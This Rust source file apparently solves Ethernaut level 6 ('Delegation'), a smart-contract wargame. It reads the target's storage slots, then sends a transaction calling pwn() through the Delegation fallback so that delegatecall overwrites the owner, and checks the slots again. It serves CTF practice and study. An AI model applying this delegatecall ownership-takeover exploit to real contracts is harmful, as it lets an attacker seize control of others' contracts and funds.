use alloy::sol_types::SolCall;
#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract Delegation {
    }

    #[sol(rpc)]
    contract Delegate {
        function pwn() public;
    }
}

use crate::ethernaut::{self};

use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level06_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level06())?;

    Ok(())
}

async fn level06() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let delegation_address = "0xF781cEe159Fe087c54F6823486100F23b4db9c94".parse()?;

    println!("[CHECK]");
    let slot0 = provider
        .get_storage_at(delegation_address, U256::from(0))
        .await?;
    let slot1 = provider
        .get_storage_at(delegation_address, U256::from(1))
        .await?;
    println!("[delegation.owner()]    owner = 0x{:x}", slot0);
    println!("[delegation.slot1]    delegate = 0x{:x}\n", slot1);

    let calldata = Delegate::pwnCall {}.abi_encode(); // pwnCall是结构体
    let request = TransactionRequest::default()
        .with_to(delegation_address)
        .with_input(calldata);
    let tx = provider.send_transaction(request).await?;
    println!(
        "[Delegation.fallback()]    Panding transaction... {}",
        tx.tx_hash()
    );

    let receipt = tx.get_receipt().await?;
    println!(
        "[Delegation.fallback()]    included in block {}\n",
        receipt.block_number.expect("Failed to get block number")
    );

    println!("[CHECK]");
    let slot0 = provider
        .get_storage_at(delegation_address, U256::from(0))
        .await?;
    let slot1 = provider
        .get_storage_at(delegation_address, U256::from(1))
        .await?;
    println!("[delegation.owner()]    owner = 0x{:x}", slot0);
    println!("[delegation.slot1]    delegate = 0x{:x}", slot1);

    Ok(())
}
